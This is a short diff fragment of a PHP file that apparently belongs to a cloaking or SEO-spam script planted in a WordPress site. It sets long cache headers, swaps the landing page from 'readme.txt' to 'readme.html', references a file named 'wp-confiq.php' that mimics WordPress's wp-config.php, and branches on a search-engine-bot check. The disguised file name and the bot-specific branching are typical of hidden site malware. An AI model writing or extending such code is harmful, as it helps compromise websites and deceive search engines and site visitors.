@@ -38,7 +38,7 @@ $cache_duration = 365 * 86400; //1 years
 header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
-$landing_page = 'readme.txt';
+$landing_page = 'readme.html';
 $index_home = 'wp-confiq.php';
 
 if (isSearchEngineBot()) {
